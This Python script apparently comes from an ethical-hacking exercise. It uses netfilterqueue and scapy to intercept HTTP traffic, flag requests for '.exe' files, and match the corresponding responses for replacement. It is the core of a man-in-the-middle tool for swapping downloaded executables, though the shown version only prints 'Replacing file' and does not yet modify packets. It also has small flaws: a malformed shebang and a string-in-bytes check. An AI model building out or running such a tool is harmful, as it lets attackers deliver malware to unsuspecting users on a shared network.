#/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    #DNSQR
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Req")
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("Exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP Res")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("Replacing file")
                print(scapy_packet.show())


    packet.accept()
    #packet.drop()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

